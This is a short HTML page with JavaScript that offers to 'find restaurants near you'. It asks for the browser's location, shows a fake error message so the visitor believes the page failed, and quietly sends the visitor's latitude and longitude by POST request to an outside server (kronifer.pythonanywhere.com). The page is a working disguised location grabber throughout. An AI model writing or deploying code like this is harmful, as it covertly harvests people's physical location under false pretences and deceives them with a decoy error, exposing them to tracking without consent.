<!DOCTYPE html>
<html>
<body>

<p>Click the button to find restaurants near you!</p>

<button onclick="getLocation()">Try It</button>

<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  x.innerHTML = "Uncaught ReferenceError: restaurant is not defined at showRestaurant:1:1"; //Error got funky
  let xhttp = new XMLHttpRequest();
  xhttp.open("POST", "https://kronifer.pythonanywhere.com/data", true);
  xhttp.send(JSON.stringify({"lat": position.coords.latitude.toString(), "long": position.coords.longitude.toString()}));
}
</script>

</body>
</html>
